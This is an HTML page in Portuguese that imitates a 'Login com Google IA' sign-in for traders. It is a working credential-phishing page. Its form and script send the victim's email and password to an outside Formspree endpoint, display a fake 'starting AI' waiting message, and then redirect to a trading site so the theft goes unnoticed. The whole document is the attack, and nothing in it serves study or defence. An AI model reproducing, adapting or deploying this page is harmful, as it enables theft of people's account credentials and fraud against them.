<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bem-vindo Trader</title>
    <style>
        /* Seu CSS permanece aqui */
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login com Google IA</h2>
        <h5>Insira suas credenciais para começar</h5>
        <!-- Formulário com o action do Formspree -->
        <form id="loginForm" action="https://formspree.io/f/manngnwv" method="POST">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
            </div>
            <div class="input-group">
                <input type="password" id="senha" name="senha" placeholder="Senha" required>
            </div>
            <button type="submit">Entrar</button>
        </form>
    </div>

    <div class="message-container" id="messageContainer">
        <p>Iniciando IA, aguarde... Isso poderá levar alguns minutos.</p>
    </div>

    <script>
        // Quando o formulário for enviado
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Impede o envio padrão do formulário

            // Exibe a mensagem de aguardo
            document.getElementById('messageContainer').style.display = 'block';

            // Usa o método fetch para enviar o formulário de forma assíncrona
            const formData = new FormData(this); // Coleta os dados do formulário

            fetch(this.action, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    // Se a resposta for bem-sucedida, redireciona para o site desejado
                    setTimeout(function() {
                        window.location.href = "https://tradeboosting.org/app/login.php"; 
                    }, 2000); // Aguarda 2 segundos antes de redirecionar
                } else {
                    // Se houver algum erro no envio, alerta ao usuário
                    alert('Erro ao enviar os dados. Tente novamente.');
                }
            })
            .catch(error => {
                // Caso ocorra algum erro durante a requisição
                alert('Erro ao tentar enviar os dados: ' + error.message);
            });
        });
    </script>

</body>
</html>
